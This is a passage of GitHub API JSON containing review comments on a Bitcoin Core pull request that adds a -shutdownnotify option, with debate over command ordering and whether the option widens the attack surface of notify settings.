    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/965705141",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-965705141",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 965705141,
    "node_id": "IC_kwDOABII5845j321",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?u=2d5fe6203a3723b61b4ed186ff39586d23a5bd3c&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-10T20:09:53Z",
    "updated_at": "2021-11-10T20:17:10Z",
    "author_association": "CONTRIBUTOR",
    "body": "@theStack thanks a lot for helping with testing and spotting this issue!\r\n\r\nThe reason why it returns `503` is because we call [`Interrupt(...)`](https://github.com/bitcoin/bitcoin/blob/master/src/init.cpp#L159) before [`Shutdown`](https://github.com/bitcoin/bitcoin/blob/master/src/init.cpp#L178) causing all RPC calls in `shutdownnotify` to fail.\r\nhttps://github.com/bitcoin/bitcoin/blob/f63bf05e73ea96e5c2c72cc455d05ad382883c27/src/bitcoind.cpp#L246-L247\r\n\r\na35f954 to 772a7a2: \r\n* Moved `ShutdownNotify` from `Shutdown` to `Interrupt` to allow for final RPC calls.\r\n\r\n<details> \r\n<summary> Making final RPC calls </summary>\r\n\r\nCommands:\r\n```\r\n$  ./src/bitcoind -signet -nolisten -noconnect -shutdownnotify=\"./src/bitcoin-cli -signet getblockchaininfo > tmp.txt\"\r\n$ ./src/bitcoin-cli stop\r\n$ cat tmp.txt\r\n```\r\n![image](https://user-images.githubusercontent.com/49265907/141186183-cbc6f82c-400d-4a8b-baba-27c0346c2c8a.png)\r\n</details>\r\n\r\n\r\n\r\n  \r\n",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/965705141/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970326807",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970326807",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 970326807,
    "node_id": "IC_kwDOABII58451gMX",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?u=2d5fe6203a3723b61b4ed186ff39586d23a5bd3c&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-16T14:27:16Z",
    "updated_at": "2021-11-16T14:27:16Z",
    "author_association": "CONTRIBUTOR",
    "body": "@prayank23 Thanks a lot for the feedback!\r\n\r\nWhile I agree that adding this option will give attackers an additional avenue to exploit newbies but IMO it does not make Bitcoin Core any less secure. \r\n\r\nAttackers can already utilize any existing `-*notify` option to perform the same attack thus adding this option does not make it less secure. Additionally, this PR simply adds an additional call to `runCommand` and will not make it more difficult to improve `runCommand` if we choose to do so in the future. Hence, I feel that there is no loss in incorporating `shutdownnotify` to Bitcoin Core. \r\n\r\nHappy to hear the opinion of the other reviewers and happy to close this PR if the majority feels that `shutdownnotify` should not be incorporated into Bitcoin Core.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970326807/reactions",
      "total_count": 5,
      "+1": 5,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970481934",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970481934",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 970481934,
    "node_id": "IC_kwDOABII58452GEO",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?u=03240c7cca7b55e5b9239eeab7a5914663a42b91&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-16T17:09:31Z",
    "updated_at": "2021-11-16T17:09:31Z",
    "author_association": "CONTRIBUTOR",
    "body": "> Attackers can already utilize any existing -*notify option to perform the same attack thus adding this option does not make it less secure. \r\n\r\nIt provides more options. I have shared few in  https://github.com/bitcoin/bitcoin/issues/23412#issuecomment-970480769 under the section `Other ways to use these config params effectively`\r\n\r\n> Additionally, this PR simply adds an additional call to runCommand and will not make it more difficult to improve runCommand if we choose to do so in the future.\r\n\r\nBased on the comments in this PR and https://github.com/bitcoin/bitcoin/issues/23412, I still have no clarity what are we going to do with `runCommand`. Neither I understand why others are ignoring this issue nor the urgency to add `-shutdownnotify`. \r\n\r\n> Hence, I feel that there is no loss in incorporating shutdownnotify to Bitcoin Core.\r\n\r\n1. It will use the same logic until we change something in `runCommand`.\r\n2. Provides more options for attackers.\r\n3. If the solution in future requires using _notifications.dat_ then everything we do in this PR will be reversed\r\n4. No clarity on documentation about security recommendations\r\n\r\n",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970481934/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970483856",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970483856",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 970483856,
    "node_id": "IC_kwDOABII58452GiQ",
    "user": {
      "login": "sipa",
      "id": 548488,
      "node_id": "MDQ6VXNlcjU0ODQ4OA==",
      "avatar_url": "https://avatars.githubusercontent.com/u/548488?u=7999a16349f0df0fb273fffa18e5a955c9d3f11c&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/sipa",
      "html_url": "https://github.com/sipa",
      "followers_url": "https://api.github.com/users/sipa/followers",
      "following_url": "https://api.github.com/users/sipa/following{/other_user}",
      "gists_url": "https://api.github.com/users/sipa/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/sipa/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/sipa/subscriptions",
      "organizations_url": "https://api.github.com/users/sipa/orgs",
      "repos_url": "https://api.github.com/users/sipa/repos",
      "events_url": "https://api.github.com/users/sipa/events{/privacy}",
      "received_events_url": "https://api.github.com/users/sipa/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-16T17:11:35Z",
    "updated_at": "2021-11-16T17:11:52Z",
    "author_association": "MEMBER",
    "body": "@prayank23 The whole point of notifications is not needing polling. If polling is acceptable, the user can also just use RPCs to figure out if Bitcoin Core is or isn't running, so I don't see what a \"notifications.dat\" adds.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970483856/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970501847",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970501847",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 970501847,
    "node_id": "IC_kwDOABII58452K7X",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?u=03240c7cca7b55e5b9239eeab7a5914663a42b91&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-16T17:31:39Z",
    "updated_at": "2021-11-16T17:31:39Z",
    "author_association": "CONTRIBUTOR",
    "body": "I think it's possible to check a file for changes without polling: https://github.com/bitcoin/bitcoin/issues/23412#issuecomment-957502474",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970501847/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970512238",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970512238",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 970512238,
    "node_id": "IC_kwDOABII58452Ndu",
    "user": {
      "login": "MarcoFalke",
      "id": 6399679,
      "node_id": "MDQ6VXNlcjYzOTk2Nzk=",
      "avatar_url": "https://avatars.githubusercontent.com/u/6399679?u=0691974eedcc2ab5366cc1080fb1c030e87244c2&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/MarcoFalke",
      "html_url": "https://github.com/MarcoFalke",
      "followers_url": "https://api.github.com/users/MarcoFalke/followers",
      "following_url": "https://api.github.com/users/MarcoFalke/following{/other_user}",
      "gists_url": "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/MarcoFalke/subscriptions",
      "organizations_url": "https://api.github.com/users/MarcoFalke/orgs",
      "repos_url": "https://api.github.com/users/MarcoFalke/repos",
      "events_url": "https://api.github.com/users/MarcoFalke/events{/privacy}",
      "received_events_url": "https://api.github.com/users/MarcoFalke/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-16T17:43:58Z",
    "updated_at": "2021-11-16T17:43:58Z",
    "author_association": "MEMBER",
    "body": "> I think it's possible to check a file for changes without polling: #23412 (comment)\r\n\r\nSo users that want to use notifications need to install a potentially backdoored third-party tool? Seems backward when the goal is to increase security.\r\n\r\nNow for the third time, I urge you to keep the *general* discussion about `runCommand` to #23412 and not this pull request.\r\n\r\n> Provides more options for attackers.\r\n\r\nNo it does not. All options share the same path to attack. Adding or removing one doesn't change the attack path, as long as at least one is still there.\r\n\r\n> Neither I understand why others are ignoring this issue nor the urgency to add -shutdownnotify\r\n\r\nThe issue isn't ignored, it is well known that those local configuration options (and many more, if not all) are vulnerable to an attacker that can set them. You can't force other people to work on something or force them to look at something. This is open source.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970512238/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970530105",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970530105",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 970530105,
    "node_id": "IC_kwDOABII58452R05",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?u=03240c7cca7b55e5b9239eeab7a5914663a42b91&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-16T18:06:35Z",
    "updated_at": "2021-11-16T18:07:11Z",
    "author_association": "CONTRIBUTOR",
    "body": "> Now for the third time, I urge you to keep the general discussion about runCommand to #23412 and not this pull request.\r\n\r\nPlease check the above comment for context as it was a response. All things which aren't related to PR or can be kept separate are in issue https://github.com/bitcoin/bitcoin/issues/23412\r\n\r\n> The issue isn't ignored, it is well known that those local configuration options (and many more, if not all) are vulnerable to an attacker that can set them. You can't force other people to work on something or force them to look at something. This is open source.\r\n\r\nI can't force but I can review and comment. I don't have access to close/merge a PR. ",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970530105/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970539711",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970539711",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 970539711,
    "node_id": "IC_kwDOABII58452UK_",
    "user": {
      "login": "michaelfolkson",
      "id": 16323900,
      "node_id": "MDQ6VXNlcjE2MzIzOTAw",
      "avatar_url": "https://avatars.githubusercontent.com/u/16323900?u=e2201a78ad660e42fd175003d02ad749b855e0a9&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/michaelfolkson",
      "html_url": "https://github.com/michaelfolkson",
      "followers_url": "https://api.github.com/users/michaelfolkson/followers",
      "following_url": "https://api.github.com/users/michaelfolkson/following{/other_user}",
      "gists_url": "https://api.github.com/users/michaelfolkson/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/michaelfolkson/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/michaelfolkson/subscriptions",
      "organizations_url": "https://api.github.com/users/michaelfolkson/orgs",
      "repos_url": "https://api.github.com/users/michaelfolkson/repos",
      "events_url": "https://api.github.com/users/michaelfolkson/events{/privacy}",
      "received_events_url": "https://api.github.com/users/michaelfolkson/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-16T18:18:46Z",
    "updated_at": "2021-11-16T18:18:46Z",
    "author_association": "CONTRIBUTOR",
    "body": "@prayank23: Your Approach NACK with your rationale has been registered. If you have further questions or discussion points please take them elsewhere (IRC etc). You have to let other reviewers review the PR and make their own mind up.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970539711/reactions",
      "total_count": 1,
      "+1": 1,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970549874",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970549874",
    "issue_url": "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
    "id": 970549874,
    "node_id": "IC_kwDOABII58452Wpy",
    "user": {
      "login": "prayank23",
      "id": 13405205,
      "node_id": "MDQ6VXNlcjEzNDA1MjA1",
      "avatar_url": "https://avatars.githubusercontent.com/u/13405205?u=03240c7cca7b55e5b9239eeab7a5914663a42b91&v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/prayank23",
      "html_url": "https://github.com/prayank23",
      "followers_url": "https://api.github.com/users/prayank23/followers",
      "following_url": "https://api.github.com/users/prayank23/following{/other_user}",
      "gists_url": "https://api.github.com/users/prayank23/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/prayank23/subscriptions",
      "organizations_url": "https://api.github.com/users/prayank23/orgs",
      "repos_url": "https://api.github.com/users/prayank23/repos",
      "events_url": "https://api.github.com/users/prayank23/events{/privacy}",
      "received_events_url": "https://api.github.com/users/prayank23/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2021-11-16T18:26:07Z",
    "updated_at": "2021-11-16T18:26:54Z",
    "author_association": "CONTRIBUTOR",
    "body": "@michaelfolkson I wasn't aware we can't respond to comments like https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970326807 in the same PR\r\n\r\nOr https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-970483856\r\n\r\nNone of these comments were an attempt to stop others from reviewing this PR. \r\n\r\nI won't comment further on this PR and will discuss elsewhere.",
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/970549874/reactions",
      "total_count": 1,
      "+1": 1,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741301961",
    "pull_request_review_id": 795699163,
    "id": 741301961,
    "node_id": "PRRC_kwDOABII584sL17J",
    "diff_hunk": "@@ -174,9 +174,20 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::string cmd = args.GetArg(\"-shutdownnotify\", \"\");\n+    if (!cmd.empty()) {",
    "path": "src/init.cpp",
    "position": null,
    "original_position": 8,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "df9fde85b43d1ce34e30c7a0954ee616926473d6",
    "user": {
      "login": "luke-jr",
      "id": 1095675,
      "node_id": "MDQ6VXNlcjEwOTU2NzU=",
      "avatar_url": "https://avatars.githubusercontent.com/u/1095675?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/luke-jr",
      "html_url": "https://github.com/luke-jr",
      "followers_url": "https://api.github.com/users/luke-jr/followers",
      "following_url": "https://api.github.com/users/luke-jr/following{/other_user}",
      "gists_url": "https://api.github.com/users/luke-jr/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/luke-jr/subscriptions",
      "organizations_url": "https://api.github.com/users/luke-jr/orgs",
      "repos_url": "https://api.github.com/users/luke-jr/repos",
      "events_url": "https://api.github.com/users/luke-jr/events{/privacy}",
      "received_events_url": "https://api.github.com/users/luke-jr/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Suggest using a loop over potentially multiple options as in #22372",
    "created_at": "2021-11-02T17:08:55Z",
    "updated_at": "2021-11-02T17:10:24Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r741301961",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "MEMBER",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741301961"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r741301961"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741301961/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": null,
    "original_line": 181,
    "side": "RIGHT"
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741930540",
    "pull_request_review_id": 796528797,
    "id": 741930540,
    "node_id": "PRRC_kwDOABII584sOPYs",
    "diff_hunk": "@@ -174,9 +174,20 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::string cmd = args.GetArg(\"-shutdownnotify\", \"\");\n+    if (!cmd.empty()) {",
    "path": "src/init.cpp",
    "position": null,
    "original_position": 8,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "df9fde85b43d1ce34e30c7a0954ee616926473d6",
    "user": {
      "login": "klementtan",
      "id": 49265907,
      "node_id": "MDQ6VXNlcjQ5MjY1OTA3",
      "avatar_url": "https://avatars.githubusercontent.com/u/49265907?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/klementtan",
      "html_url": "https://github.com/klementtan",
      "followers_url": "https://api.github.com/users/klementtan/followers",
      "following_url": "https://api.github.com/users/klementtan/following{/other_user}",
      "gists_url": "https://api.github.com/users/klementtan/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/klementtan/subscriptions",
      "organizations_url": "https://api.github.com/users/klementtan/orgs",
      "repos_url": "https://api.github.com/users/klementtan/repos",
      "events_url": "https://api.github.com/users/klementtan/events{/privacy}",
      "received_events_url": "https://api.github.com/users/klementtan/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Done \ud83d\udc4d\ud83c\udffb ",
    "created_at": "2021-11-03T13:22:25Z",
    "updated_at": "2021-11-03T13:22:26Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r741930540",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "CONTRIBUTOR",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741930540"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r741930540"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741930540/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": null,
    "original_line": 181,
    "side": "RIGHT",
    "in_reply_to_id": 741301961
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742214334",
    "pull_request_review_id": 796936198,
    "id": 742214334,
    "node_id": "PRRC_kwDOABII584sPUq-",
    "diff_hunk": "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The shutdownnotify option is used to specify a command to execute when Bitcoin\n+Core has finished with its shutdown sequence. (#23395)",
    "path": "doc/release-notes.md",
    "position": null,
    "original_position": 5,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
    "user": {
      "login": "luke-jr",
      "id": 1095675,
      "node_id": "MDQ6VXNlcjEwOTU2NzU=",
      "avatar_url": "https://avatars.githubusercontent.com/u/1095675?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/luke-jr",
      "html_url": "https://github.com/luke-jr",
      "followers_url": "https://api.github.com/users/luke-jr/followers",
      "following_url": "https://api.github.com/users/luke-jr/following{/other_user}",
      "gists_url": "https://api.github.com/users/luke-jr/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/luke-jr/subscriptions",
      "organizations_url": "https://api.github.com/users/luke-jr/orgs",
      "repos_url": "https://api.github.com/users/luke-jr/repos",
      "events_url": "https://api.github.com/users/luke-jr/events{/privacy}",
      "received_events_url": "https://api.github.com/users/luke-jr/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Needs updating",
    "created_at": "2021-11-03T18:16:13Z",
    "updated_at": "2021-11-03T18:19:14Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742214334",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "MEMBER",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742214334"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742214334"
      },
      "pull_request": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
      }
    },
    "reactions": {
      "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742214334/reactions",
      "total_count": 0,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 0,
      "rocket": 0,
      "eyes": 0
    },
    "start_line": null,
    "original_start_line": null,
    "start_side": null,
    "line": null,
    "original_line": 87,
    "side": "RIGHT"
  },
  {
    "url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742215098",
    "pull_request_review_id": 796936198,
    "id": 742215098,
    "node_id": "PRRC_kwDOABII584sPU26",
    "diff_hunk": "@@ -174,13 +174,25 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        std::thread t(runCommand, cmd);\n+        t.join(); // thread runs free",
    "path": "src/init.cpp",
    "position": null,
    "original_position": 9,
    "commit_id": "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
    "original_commit_id": "812910ec4022d8ae1e355e3cfaf7292a020fb74a",
    "user": {
      "login": "luke-jr",
      "id": 1095675,
      "node_id": "MDQ6VXNlcjEwOTU2NzU=",
      "avatar_url": "https://avatars.githubusercontent.com/u/1095675?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/luke-jr",
      "html_url": "https://github.com/luke-jr",
      "followers_url": "https://api.github.com/users/luke-jr/followers",
      "following_url": "https://api.github.com/users/luke-jr/following{/other_user}",
      "gists_url": "https://api.github.com/users/luke-jr/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/luke-jr/subscriptions",
      "organizations_url": "https://api.github.com/users/luke-jr/orgs",
      "repos_url": "https://api.github.com/users/luke-jr/repos",
      "events_url": "https://api.github.com/users/luke-jr/events{/privacy}",
      "received_events_url": "https://api.github.com/users/luke-jr/received_events",
      "type": "User",
      "site_admin": false
    },
    "body": "Probably should start all the commands, *then* wait on them. (If a user wants a sequence of commands to run synchronously, he can just specify them as a single `-shutdownnotify` or use a shell script.)",
    "created_at": "2021-11-03T18:17:15Z",
    "updated_at": "2021-11-03T18:19:14Z",
    "html_url": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742215098",
    "pull_request_url": "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
    "author_association": "MEMBER",
    "_links": {
      "self": {
        "href": "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/742215098"
      },
      "html": {
        "href": "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r742215098"
      },
      "pull_request": {
